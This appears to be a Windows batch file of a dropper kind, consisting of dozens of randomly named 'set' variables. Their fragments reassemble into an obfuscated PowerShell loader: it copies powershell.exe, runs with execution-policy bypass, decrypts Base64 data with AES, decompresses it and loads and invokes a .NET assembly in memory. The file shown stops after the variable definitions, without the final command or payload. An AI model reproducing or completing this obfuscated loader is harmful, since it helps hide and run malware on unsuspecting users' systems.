@echo off
set "sogkAfRMiQ=he"
set "vairWXxUVW=Po"
set "GcrPlguRGP=xe"
set "NXsDGmvoNG=ll"
set "QZWZVNJgIP=Wi"
set "eTFpFqYLGY=y "
set "HSbmRgjCMx=we"
set "AtYOgAHvrP=:\"
set "kQjAwQkcpP=Sy"
set "YDcuFBvTKb=\v"
set "WZGcxAisVm=rs"
set "eLcNdqXNBb=st"
set "QCLCWmDNbX=s\"
set "NIUwuUrCMI=32"
set "ryHHfQuMhd=he"
set "LAciyUrWDX=ow"
set "npLJxxYdrN=py"
set "RCeebvQGtj=do"
set "JoGOTfAYyG=\W"
set "aYYbFZGdwk= /"
set "ZuaTrifPRT=ws"
set "yKjVyrvVtE=nd"
set "RiSdyIssdY=co"
set "mzNWKTXRpU= C"
set "uAbgVSLhRs=we"
set "oTEpHUPrJs=rS"
set "BcoyuOvnbD=po"
set "hglDFikuha=1."
set "MxuJysjhNA=0\"
set "wMDKZVYHYl=em"
set "YWKxBhtNck=ll"
set "HbpuDCvmbT=.e"
set "pQlaAxnzAA=in"
set "GTynBRtnHx= %~dp0"
set "sZTlutxTkR=cd"
set "pUPyoeDrjC=OAJL"
set "ehaFaKjxmC=kHh."
set "kpwJulDJWA=d;$E"
set "rLoeQapfJA=join"
set "uDevaqZjYQ=Qy.T"
set "iNilRGAzEv=m.Re"
set "TjRvNPnFfO=ct S"
set "djpsKlXRjK=hy.A"
set "SXHmllHZOD=pStr"
set "fZJzWivOYu=]::("
set "xvJuzxCBJg=ateD"
set "rrDRbFTlNE='txe"
set "puIaYfPBen=rity"
set "cSEctXRJrd=$EzM"
set "bKZHmRzjcz==');"
set "pbqPsTFlib=form"
set "pVEwMSaHxe=morF"
set "ixmHTzzByi=pres"
set "XJhKnDrSzy=HzX."
set "zjugGbjdjt=-ep "
set "EQHgAzSgYs= if "
set "KVttHdXWIO=trea"
set "bEqaSfIEJB=O.Me"
set "rIFRMqqdXB=ress"
set "MIVIpWMycx= = $"
set "RnDRtjjcfl=brea"
set "XnlawNnbcX=Fina"
set "QmozXQFanR=;$oN"
set "tmDZomLGNs=fN.I"
set "zGoqNjIIpO= = ["
set "xkwnKvVmuE=.Cop"
set "ytVCMNscXY=stem"
set "idgdwhDxUg=qUXQ"
set "RDfaqMrOtT=]::N"
set "KDjRVEThNz=ke($"
set "NfKKEYoQDX=)($w"
set "zleXlFnPhe=.Ass"
set "dvaxZYpYHj=;$pU"
set "ShBiELbKqh=ode]"
set "uaUqapbRtU='[-1"
set "EsAslRHpry=[IO."
set "BCQetAvGBx=YDq "
set "deUsVcGbLY=..-1"
set "lVoMFVFMdM=gth)"
set "nXGVkFxDqm=n ''"
set "KZbxFhjiwL=ew-O"
set "pcRXBIEULc=kHh "
set "ihamBClyWg=oryS"
set "EzZHpufcOD=X = "
set "SNoKMekGhz=);$E"
set "IQZZjlmKNv=ose("
set "SNDIXHUYuX=$pUH"
set "vScHLXRTRU=ypto"
set "wIPGpJaHmu=Bmor"
set "JYoOlTDdnE=raph"
set "iOziOrvZCX=Star"
set "TpxBekalAJ= '')"
set "sEOCJlsoVf=sion"
set "EyCTFJVgao=raph"
set "fzTpCBrhuR=ptog"
set "hrpqfpdVLN=bypa"
set "zCpokHQAQU=onve"
set "GgCvcBikor=EzMf"
set "osYcCWnKwl=k; }"
set "WcECqurnjy= = $"
set "NGYbRlEAwH=e]::"
set "LuEeomWOAu=($iW"
set "EgPsoawNyM=XyUP"
set "dPaqkmyFXD='[-1"
set "oFKIxMVMgF=embl"
set "MHqRKbTTqx=t Sy"
set "fsDxqjDtJa=.Key"
set "syBYXIGfNq=Qy);"
set "EJHxclGSwX=oint"
set "cmFVNCQEIh=QN ="
set "sRklqcVVWB=1..-"
set "vmBWVYcMtN=Qy ="
set "wmvIOftYpE=Comp"
set "APPwaPSGRx=.Sec"
set "kkxNOpRdfk=oin "
set "PrRNjqCONa=iWkH"
set "GgLIEgKyDn=YDq."
set "bHpUsQMCCj=N) {"
set "rDqugezDor=)))"
set "SQJUPpmZgo=Invo"
set "TsyIDivZis=stem"
set "hubsGuFnPx=736u"
set "mciGDVWQVF=);$w"
set "lGhwSUwvxu=yste"
set "pVTMSeUtLd=ZYYc"
set "xvelcbMSqG= [Sy"
set "JHeuwOVJhx=Stre"
set "WcMvXJkmkn=$Jzz"
set "AiwjliHXLg=saBm"
set "GFWCoSoWdx=);$E"
set "ASUdZjIgku= '')"
set "PxMZhmRVDt=Secu"
set "ITHHcsXsvp=m.IO"
set "NDFBGvnQoc=comp"
set "biKbmuiEAC=flec"
set "roNhiyDNrI=fore"
set "CeoWcqwZcu=cuQg"
set "bYuujrSVxX=..-1"
set "GSKNNYlKha=tem."
set "AcOvkHYGLt=$Jzz"
set "DeCqjTkbhI=null"
set "AMnJPmUXCM=ment"
set "nrJFzqXLgJ='')("
set "YauczdlDZQ=e = "
set "eFhOHYcjQL=bstr"
set "BsSMHUCcrw=qVuo"
set "sOoqljqXmR=3); "
set "oYYJMzhReP=rt]:"
set "KfmyhsPPvU=3HWs"
set "rjIRNuzKmc=BC;$"
set "imcTBefhNJ=grap"
set "dJyDfRUuZo=, (,"
set "YLyGquhWuS=AJL."
set "zGDneXkwSm=OyzA"
set "RJAyqHrOnd=$Jzz"
set "JziyJXQNbO=('%*'"
set "tInucdrGdR=esMa"
set "UZLiuPxsrL=pose"
set "HUjUmssMik=tS46"
set "TEzeRiKtjS=ach "
set "OIWMJxwpZt=-joi"
set "puUwkXUvpX=:: '"
set "oHVSobLKxo=ddin"
set "raBAMDqOkl=oArr"
set "dgZqmWhlCM=ispo"
set "iFMclRuUaA= = N"
set "IiXyxGvtrB=-joi"
set "fsluiKJLTX=] -j"
set "mPxdkwZDBT=.Con"
set "yajjtdQIVz=X = "
set "HIQDodJZAC=PKCS"
set "gGYqdPalXs=Obje"
set "AErPHyhsyo=ionM"
set "bINHuksSXO=iron"
set "nutKaBHiQe=();$"
set "kkMFnvRdDV=::('"
set "KtFbzZeESD=ptor"
set "ZVIyeuAVDe=j = "
set "GwqRjbkjvo=n ''"
set "hUDdHqJlFo=.Cry"
set "fjZSGDcPDF=pher"
set "UUGSxeJWNj=jrZY"
set "UYbhexQcgQ=th('"
set "ZkLqncwVxx=($iW"
set "ZFGVAEhwck=Comp"
set "BdSAAiXxws=-Obj"
set "zedpBbEVdb=vert"
set "HfWZTkKxns=$XyU"
set "VJvXZLcLLi=y.Ci"
set "EAVhzAqnFC=6esa"
set "nYyNAxZxkw=.Mem"
set "yAkKmxOCBt=.Len"
set "TvUnWOAvBO=eam("
set "yRpyAIMRDQ=join"
set "jhKLoNqWBL=nirt"
set "wOYOsUxdhv=ress"
set "FbrHwSIeYd=lit("
set "aPmUNYCMwL=m.IO"
set "TvFsfHwzhj=-1.."
set "kZxlvcvPpf=New-"
set "zPgjCTwpWv=ne);"
set "XsbTAWnJml=ewLi"
set "ilNxBUmdRl=rofi"
set "xPBAVPeMPH=('da"
set "uIkAvKkhQa=yTo("
set "fTwKDgZhrZ=Conv"
set "tpmPhnDdMa=yUPX"
set "MtADgJXmhK=zMfN"
set "eeuApBzOen=se()"
set "rjxqUwOqho=isfL"
set "CtGOjuQcbA=zMfN"
set "yMvtShpuTL=]::C"
set "HQSYlvMgaH=New-"
set "YoJZDrPQBV=v4Ir"
set "mcMBTCoNco=gnir"
set "gSQvekjyIc=X, 0"
set "eEgYuLlAlg=tem."
set "mAiuAhhYXa=m(, "
set "RosUlwFaSU=XyUP"
set "qSLtiCyqtc=Syst"
set "KqjLudEWOP=$jrZ"
set "UMirHIOXEI=ert]"
set "EtjtJQKpEh=-nop"
set "vpzbfkIVTB=).Sp"
set "tEFFpVKsPO=)($X"
set "rotbIRSafY=$qUX"
set "SNyfDPpjgC=rtS4"
set "DMdeQxaAjm=Disp"
set "VgzhdOiLYe=tion"
set "vxrVZLqMht=6] -"
